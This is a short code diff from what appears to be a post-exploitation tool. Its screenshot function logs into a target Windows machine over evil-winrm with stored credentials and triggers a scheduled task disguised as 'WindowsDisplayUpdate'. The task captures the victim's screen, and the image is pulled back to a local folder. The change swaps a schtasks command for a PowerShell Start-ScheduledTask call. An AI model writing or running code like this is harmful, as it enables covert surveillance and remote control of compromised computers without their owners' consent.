@@ -101,7 +101,8 @@ def screenshot(target_ip):
         TASK_NAME = "WindowsDisplayUpdate"
         REMOTE_FILE = "C:\\Users\\Public\\screen.png"
         LOCAL_FILE = f"./Box/screen_{target_ip}_{timestamp}.png"
-        payload = 'schtasks /run /tn "WindowsDisplayUpdate"\nexit\n'
+        payload = 'Start-ScheduledTask -TaskName "WindowsDisplayUpdate"'
+
 
         subprocess.run(
             ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
